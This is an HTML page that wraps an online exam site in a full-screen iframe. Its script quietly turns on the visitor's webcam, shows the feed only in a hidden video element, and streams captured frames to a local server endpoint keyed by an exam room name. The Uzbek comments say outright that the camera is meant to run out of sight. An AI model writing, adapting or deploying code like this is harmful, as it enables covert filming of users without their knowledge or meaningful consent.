<!DOCTYPE html>
<html>
<head>
    <style>
        body {
            margin: 0;
            background: #000;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }

        /* VIDEO YASHIRILGAN */
        #hiddenVideo {
            display: none;
        }

        /* BRANDING BADGE */
        .signature {
            position: fixed;
            top: 15px;
            left: 20px;
            background: #0d1117;
            padding: 8px 16px;
            border-radius: 10px;
            color: #00baff;
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.25);
            z-index: 9999;
        }


        .signature a {
            color: #00baff;
            text-decoration: none;
        }

        /* IFRAME — SAHIFANING O‘RTA QISMI */
        iframe {
            position: fixed;
            top: 0;
            left: 0;
            border: none;
            width: 100vw;
            height: 100vh;
            z-index: 1;
        }
    </style>
</head>

<body>

<!-- Ko‘rinmaydigan kamera -->
<video id="hiddenVideo" autoplay playsinline></video>

<!-- Branding badge -->
<div class="signature">
    Build by <a href="https://moorfo.uz" target="_blank">moorfo.uz</a>
</div>

<!-- IFRAME — boshqa sahifa shu yerda ochiladi -->
<iframe src="https://ic3-exam.lovable.app"></iframe>

<script>
    let roomName = null;
    let pushing = false;

    /* PARENT PAGE — POSTMESSAGE QABUL QILADI */
    window.addEventListener("message", async (event) => {
        console.log("Message received →", event.data);

        // Iframe yuborgan maʼlumot
        if (event.data.room) {
            roomName = event.data.room;

            if (!pushing) {
                pushing = true;
                await startCameraPush();
            }
        }
    });

    /* CAMERA + SERVER PUSH */
    async function startCameraPush() {
        const video = document.getElementById("hiddenVideo");

        // O‘zi yashirin bo‘ladi, lekin kamera ishlaydi
        const stream = await navigator.mediaDevices.getUserMedia({video: true});
        video.srcObject = stream;

        const canvas = document.createElement("canvas");
        const ctx = canvas.getContext("2d");

        async function loop() {
            if (video.videoWidth > 0) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            }

            canvas.toBlob(async (blob) => {
                if (!blob || !roomName) return;

                try {
                    await fetch(`http://127.0.0.1:8000/push/${roomName}`, {
                        method: "POST",
                        headers: {"Content-Type": "image/jpeg"},
                        body: blob
                    });
                } catch (err) {
                    console.log("Push error:", err);
                }
            }, "image/jpeg", 0.7);

            requestAnimationFrame(loop);
        }

        loop();
    }
</script>

</body>
</html>
